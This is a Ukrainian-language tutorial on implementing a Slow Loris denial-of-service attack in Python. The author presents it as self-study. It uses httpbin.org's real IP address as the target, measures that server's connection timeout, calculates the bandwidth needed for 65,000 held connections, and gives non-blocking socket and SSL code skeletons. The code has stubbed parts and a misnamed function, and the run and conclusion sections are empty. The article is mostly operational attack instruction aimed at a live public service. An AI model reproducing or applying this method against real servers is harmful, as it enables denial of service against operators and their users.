# Атака Slow Loris from scratch

Дана стаття призначена для навчання принципам **Slow Loris атаки**. Варто зазначити, що цей тип атаки є **досить старим**, і сучасні системи можуть мати захист від неї. Однак цей матеріал створений виключно для **самонавчання та розуміння** принципів роботи цієї атаки. Slow Loris все ще може бути **ефективним** проти **погано сконфігурованих серверів**.

У **попередній статті** ми вже отримали схожу поведінку, експериментуючи з **вичерпанням воркерів Nginx**. Тепер розглянемо, як працює Slow Loris і як його реалізувати за допомогою Python.

## Визначення connection timeout

Щоб ефективно реалізувати **Slow Loris атаку**, спершу потрібно визначити таймаут сервера — час, протягом якого сервер тримає з’єднання відкритим, чекаючи дані. Це можна зробити за допомогою Linux утиліти `netcat` і `Wireshark` для аналізу трафіку.

### Крок 1: Визначення IP-адреси

Перетворимо доменне ім’я на IP-адресу за допомогою `nslookup`:
```
$ nslookup httpbin.org
Server:		127.0.0.53
Address:	127.0.0.53#53

Non-authoritative answer:
Name:	httpbin.org
Address: 3.230.67.98
Name:	httpbin.org
Address: 3.211.25.71
```

Як бачимо, у домену httpbin.org є дві IP-адреси. Це зв’язано з балансуванням навантаження. Для нашого експерименту зосередимося на `3.230.67.98`.

### Крок 2: Аналіз трафіку у Wireshark

Відкриємо Wireshark і вкажемо фільтр для потрібної IP-адреси:
```
ip.addr eq 3.230.67.98
```

### Крок 3: Підключення через `netcat`

У терміналі підключимося до сервера без надсилання даних:

```
$ nc 3.230.67.98 443
```

Цим самим ми встановимо TCP-з’єднання, але не будемо передавати жодних даних.

### Крок 4: Визначення таймауту

У Wireshark побачимо наступне:
- Пакет `[1]` — **ACK-пакет**, який завершує TCP-рукостискання.
- Пакет `[2]` — **FIN ACK-пакет**, який завершує з’єднання.

Час між пакетом `[1]` та пакетом `[2]` можна побачити в колонці `Time`. Наприклад:

- Пакет `[1]`: **2.5 секунди**
- Пакет `[2]`: **62.67 секунди**

Різниця між ними — 60 секунд. Таким чином, таймаут сервера становить **60 секунд**.

![Timings](https://github.com/vitalya420/articles/blob/main/images/timings.png?raw=true)

## Необхідна пропускна здатність

**Slow Loris** – це про велику кількість з’єднань. Давайте порахуємо пропускну здатність вашого інтернет-з’єднання, щоб встигнути передати дані до того, як сервер закриє з’єднання через таймаут.

Для прикладу, якщо ви відкриєте 65 000 з’єднань і кожне з них передаватиме мінімальний запит `GET / HTTP/1.1\r\nHost: httpbin.org\r\nConnection: keep-alive\r\n\r\n` розмір якого 61 байт, то ось що ми отримуємо: 

```
65 000 × 61 байти = 3 965 000 байт ≈ 3.78 МБ
```

Якщо сервер має таймаут 60 секунд, то необхідна швидкість для передачі всіх цих даних:

```
3.78 МБ / 60 секунд ≈ 61 КБ/сек
```

Для підтримки такої атаки вам вистачить навіть повільного інтернет-з’єднання. Головне – це правильно розподілити запити та дотримуватися таймінгів, щоб зберігати з’єднання якомога довше без таймаутів. Не забудьте вказати заголовок `Connection: keep-alive`, щоб сервер не закривав з’єднання одразу після відповіді.

## Стратегія відкриття і тримання з'єднаннь

1. **Відкриваємо TCP-з'єднання.** Це перший крок, щоб встановити базове підключення до сервера.

2. **Визначаємо таймаут сервера.** У нашому прикладі таймаут становить **60 секунд**, але краще припустити похибку в 5 секунд, тому встановимо його на **55 секунд**.

3. **SSL Handshake.** Після встановлення TCP-з'єднання необхідно виконати SSL Handshake, щоб забезпечити захищене підключення.

4. **Відправка незавершеного HTTP-запиту.** Наприклад, стандартний запит:
```
GET / HTTP/1.1\r\n
Host: httpbin.org\r\n
Connection: keep-alive\r\n
\r     <-- Зверніть увагу! Останній \n відсутній!
```
5. **Утримання з'єднання.** Перед завершенням таймауту (на 54-55-й секунді) ми відправляємо останній байт `\n`, щоб підтримати з'єднання.

    - Після відправки `\n` запит буде вважатися завершений і таймаут оновиться, тому знову відправляємо незавершений HTTP запит та робимо відлік часу.

6. **Паралельне відкриття додаткових з'єднань.** Відправка незавершеного запиту займає декілька мілісекунд або секунд, тому в нас є достатньо часу, щоб відкрити ще сотні або навіть тисячі нових з'єднань!

### Як рахувати timeout?

Рахувати таймаут можна для кожного з'єднання окремо. Так буде простіше в розумінні та імплементації. Інший варіант — це групувати з'єднання та рахувати таймаут від першого сокета. Плюс цього способу в тому, що з нього витікає, що сервер отримає багато запитів в один момент, які будуть опрацьовувати в один момент.

- Якщо ви хочете максимальне навантаження в один момент — груповий таймаут підходить краще.

- Для гнучкого контролю кожного з'єднання — використовуйте окремий таймаут.

![strategy](https://github.com/vitalya420/articles/blob/main/images/image2.png?raw=true)


## Event-Driven архітектура для встановлення з'єднаннь

В цій статті ми не будемо описувати принцип `Event-Driven` архітектури, але її будемо використовувати для встановлення великої кількості з'єднань. Такий підхід буде більш ефективний, ніж використання потоків. Тільки уявіть собі 65 тисяч потоків! Кошмар.

Отже, для цього ми створимо цикл подій, який відстежуватиме події в сокетах, наприклад, коли сокет готовий до читання або запису. В операційних системах для цього є системні виклики, як-от `select()` чи `epoll()` в Linux, `kevent()` у деяких дистрибутивах FreeBSD і macOS, або `WaitForMultipleObjects()` у Windows.

В Python вже є вбудована бібліотека `selectors`, яка забезпечує високорівневе та ефективне мультиплексування введення/виведення. За замовчуванням модуль використовує найбільш оптимальне рішення для вашої операційної системи (`DefaultSelector()`), і саме його ми використаємо.

Основний план такий:
1. **Створюємо обов'язково неблокуючий сокет:**

```python
import socket

ADDRESS = ("3.230.67.98", 443)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(False) # !!! MUST HAVE
    s.connect_ex(ADDRESS) # Використовуємо connect_ex, щоб уникнути виключення
    return s
```

2. **Створюємо селектор, який моніторить сокети.** Метод `.register()` третім аргументом може містити будь-які дані. Ми будемо використовувати його для зберігання колбека — функції, яка викликатиметься, коли сокет буде готовий.

```python
import selectors

sel = selectors.DefaultSelector()

def on_connected(sock):
    print("Socket connected!!")

sock = connect()
sel.register(sock, selectors.EVENT_WRITE, on_connected)

```

3. **SSL handshake:**

```python
import ssl

ctx = ssl.create_default_ctx()

req = b'GET / HTTP/1.1\r\nConnection: keep-alive\r\n\r' # <-- no \n at the end

def delay(time, sock):
    # Implement delay logic
    sock.send(b'\n')

def on_ssl_handske_completed(sock):
    # Handshake completed
    sock.send(req)
    delay(55, sock)

def on_connected(sock):
    sock = ctx.wrap_socket(sock, ...)
    try:
        sock.do_handshake()
    except ssl.SSLWantReadError:
        ... # Handle this with selectors
    except ssl.SSLWantWriteError:
        ... # and this
```

4. **Повторюємо:**

```python
while True:
    events = sel.select()
    for selector_key, event in events:
        callback = selector_key.data
        callback(selector_key.fileobj)
```

**Це лише загальний приклад.** Повний код буде доступний за посиланням.

## Запускаємо


## Висновок


## Корисні посилання

- [OG Slowloris Code](https://github.com/GHubgenius/slowloris.pl)  
- [epoll vs kqueue Benchmark](https://daemonforums.org/showthread.php?t=2124)  
- [Python Selectors Documentation](https://docs.python.org/uk/3.13/library/selectors.html)  
- [kqueue API Documentation](https://man.freebsd.org/cgi/man.cgi?kqueue)  
- [epoll API Documentation](https://man7.org/linux/man-pages/man7/epoll.7.html)
